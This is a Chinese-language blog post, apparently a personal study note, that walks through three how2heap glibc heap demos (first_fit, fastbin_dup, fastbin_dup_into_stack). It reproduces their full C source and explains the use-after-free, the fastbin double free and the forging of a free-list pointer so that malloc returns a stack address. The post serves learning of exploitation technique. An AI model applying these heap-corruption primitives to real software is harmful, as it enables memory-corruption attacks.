@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="#how2heap 寒假了终于有大把大把的时间来集中学习了，自己也制定了计划，希望自己能坚持下来吧。how2heap是表哥推荐的，涵盖了很多知识点，寒假前段时间会系统的总结一下，相关题目的wp估计会另外开一个，这个权当是知识点的总结了，也是为了方便之后自己复习 还有一篇关于内存管理的文章相当不错，也放这里码着 http://paper.seebug.org/papers/Archive/refs/">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="how2heap学习（1）">
+<meta property="og:url" content="http://yoursite.com/2019/01/15/how2heap学习（1）/index.html">
+<meta property="og:site_name" content="Asa9ao">
+<meta property="og:description" content="#how2heap 寒假了终于有大把大把的时间来集中学习了，自己也制定了计划，希望自己能坚持下来吧。how2heap是表哥推荐的，涵盖了很多知识点，寒假前段时间会系统的总结一下，相关题目的wp估计会另外开一个，这个权当是知识点的总结了，也是为了方便之后自己复习 还有一篇关于内存管理的文章相当不错，也放这里码着 http://paper.seebug.org/papers/Archive/refs/">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79ly1fz7dx2l9l6j30ei0g8q7h.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fz7e09n3fcj30im02cjsc.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fz7e2ei9yjj30xi02qmym.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fz8habshuxj30ga032wfq.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fz8ibenyvrj30hg01kq37.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79ly1fz8j05x5j2j30ko02qmy7.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79ly1fz8j0ks84bj30g6020mxi.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fz9volw1hhj30f80ektcr.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fz9vp7x2wrj30ay0100ss.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fz9wejz57pj30e70bbmyp.jpg">
+<meta property="og:updated_time" content="2019-03-01T09:23:11.967Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="how2heap学习（1）">
+<meta name="twitter:description" content="#how2heap 寒假了终于有大把大把的时间来集中学习了，自己也制定了计划，希望自己能坚持下来吧。how2heap是表哥推荐的，涵盖了很多知识点，寒假前段时间会系统的总结一下，相关题目的wp估计会另外开一个，这个权当是知识点的总结了，也是为了方便之后自己复习 还有一篇关于内存管理的文章相当不错，也放这里码着 http://paper.seebug.org/papers/Archive/refs/">
+<meta name="twitter:image" content="https://ws2.sinaimg.cn/large/006tNc79ly1fz7dx2l9l6j30ei0g8q7h.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/01/15/how2heap学习（1）/">
+
+
+
+
+
+  <title>how2heap学习（1） | Asa9ao</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Asa9ao</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/15/how2heap学习（1）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">how2heap学习（1）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-15T16:49:08+08:00">
+                2019-01-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>#how2heap</p>
+<p>寒假了终于有大把大把的时间来集中学习了，自己也制定了计划，希望自己能坚持下来吧。how2heap是表哥推荐的，涵盖了很多知识点，寒假前段时间会系统的总结一下，相关题目的wp估计会另外开一个，这个权当是知识点的总结了，也是为了方便之后自己复习</p>
+<p>还有一篇关于内存管理的文章相当不错，也放这里码着</p>
+<p><a href="http://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf" target="_blank" rel="noopener">http://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf</a></p>
+<h2 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h2><p>首先来看源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">    <span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">    c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先是申请了两块内存，并让a、b分别指向它们，然后将a的内存空间存入字符串“this is A”，然后free了a，这里我们注意到，a的内存free了，但是a并没有被我们人为的改变指针的指向，a的指针目标仍然是之前的内存，即使已经free了。</p>
+<p>然后我们又malloc了内存给了c，注意这里malloc的内存大小是小于a的。这里就会发生<strong>first-fit</strong>，简单的说，glibc在malloc时会检查free_chunk，当free_chunk的大小足够时，glibc会优先分配这个chunk，所以我们这里的c实际上也就是指向我们最开始分配的内存地址的。</p>
+<p>接着将“this is C”给了c指向的内存，接着输出a、c，通过前面的解释我们已经知道了，a、c都应该会输出“this is C”</p>
+<p>当我们分配了a、b后堆的情况如下所示</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz7dx2l9l6j30ei0g8q7h.jpg" alt="image-20190115171244727">1</p>
+<p>继续运行可以看到a的内存地址里存储的内容</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz7e09n3fcj30im02cjsc.jpg" alt="image-20190115171549866"></p>
+<p>接着程序会free掉a，我们可以在unsortedbin里看到</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fz7e2ei9yjj30xi02qmym.jpg" alt="image-20190115171752114"></p>
+<p>当我们malloc后，我们存入“this is c”，然后再次打印a指向的地址</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz8habshuxj30ga032wfq.jpg" alt="image-20190116155445184"></p>
+<p>结果和我们预测的一样。</p>
+<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>这个例子像我们展示了利用fastbin的free机制来实现double free</p>
+<p>源码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序首先分配了三块较小的内存，然后free了a，此时，a就会进入了fastbin中，且位于top。由于a是top，所以再次的free是不被允许的。此时list的状态如下(fastbin的chunk没有bk，而a的front为NULL)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [0x602000&lt;-0x0]</span><br></pre></td></tr></table></figure>
+<p>继续运行程序到b、c被free，同样进入了fastbin，c成为了top，而由于a不再是top，所以a可以再次被free</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [0x602040-&gt;0x602020-&gt;0x602000&lt;-0x0]</span><br></pre></td></tr></table></figure>
+<p>而当我们真正去再次free之后就会导致a再次成为top，这样就形成了一个环状结构</p>
+<p>下面再次分配三个chunk，我们会发现第一个分配的还是0x602000，第二个则是0x602040，第三则是0x602020，完全符合之前的fastbin结构，程序到这里就结束了，但我们很好奇，如果继续malloc会发生什么呢？简单修改程序后我们再次运行</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fz8ibenyvrj30hg01kq37.jpg" alt="image-20190116163028130"></p>
+<p>可以看到它分配的第四个chunk还是0x602000，也印证了我们刚才所说的环形结构，同时我们也知道了，假如我们有两个malloc的chunk分别是a、b，且通过double free使之形成类似的结构，当我们malloc a时，b成了fastbin的top，malloc b，a就成了fastbin的top，有种自动free的感觉。。。。</p>
+<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>实际上是在前面知识的基础上又近了一步，尝试去欺骗malloc返回一个我们可控区域的指针，还是先上源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到之前的操作没变，都是先利用了double free使得fastbin呈现环状，此时的环应该是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">0x602000</span>&lt;-&gt;<span class="number">0x602020</span>]</span><br></pre></td></tr></table></figure>
+<p>后面的操作就很有意思了，先是malloc了两次，那第一个分配的就应该是0x602000，第二个就是0x602020，接着它就改了d的值，很显然修改的就是它的fd指针的值，那当我们再次malloc时，就会产生很神奇的情况：我们再次分配了0x602000，但是由于fd是stack，所以进入fastbin的成了stack而不是0x602020，环就被打破了，当我们再次malloc，我们就实现了malloc了stack的地址。</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz8j05x5j2j30ko02qmy7.jpg" alt="image-20190116165415679"></p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz8j0ks84bj30g6020mxi.jpg" alt="image-20190116165439383"></p>
+<p>可以看到情况确实和我们想的一样，原理就是这样了，再看看具体的实现细节。我们先是定义了一个局部变量，我们都知道局部变量是在栈上的，然后取地址，再让地址减去chunk的大小，这是为什么呢？我们之前的操作可以注意到，实际上malloc返回的并不是我们实际分配空间的起始部分，它跳过了chunk的固有信息（如size），直接从内容处开始，所以d作为一个指向内容的指针，我们同样需要把我们伪造的空间的内容部分给他，而这一部分在malloc的空间没有被实际的数据填充时，也就是fd指针。</p>
